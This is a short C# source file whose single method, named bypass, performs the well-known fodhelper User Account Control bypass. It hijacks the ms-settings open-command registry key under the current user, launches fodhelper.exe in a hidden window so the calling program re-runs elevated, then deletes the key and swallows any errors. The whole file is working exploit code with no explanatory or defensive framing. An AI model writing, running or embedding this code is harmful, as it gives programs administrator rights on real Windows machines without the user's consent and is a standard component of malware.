using System.Diagnostics;
// using System.IO; 
using System;
using System.Threading;
using Microsoft.Win32;

public static class UAC
{
	public static void bypass()
	{
		try
		{
	          string f = Process.GetCurrentProcess().MainModule.FileName;
		  string regpath = "Software\\Classes\\ms-settings\\shell\\open\\command";
		  using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regpath))
		  {
	             key.SetValue("", "\"" + f + "\"");
	             key.SetValue("DelegateExecute", "");
		       }
		        Process.Start(new ProcessStartInfo
		       {
			FileName = "fodhelper.exe",
			UseShellExecute = true,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
           	       });
		  Thread.Sleep(1000);
		  Registry.CurrentUser.DeleteSubKeyTree(regpath);
		  }
		catch { } // (Exception ex) { File.AppendAllText("error.log", $"UAC Bypass Exception: {ex}{Environment.NewLine}"); }
           }
}
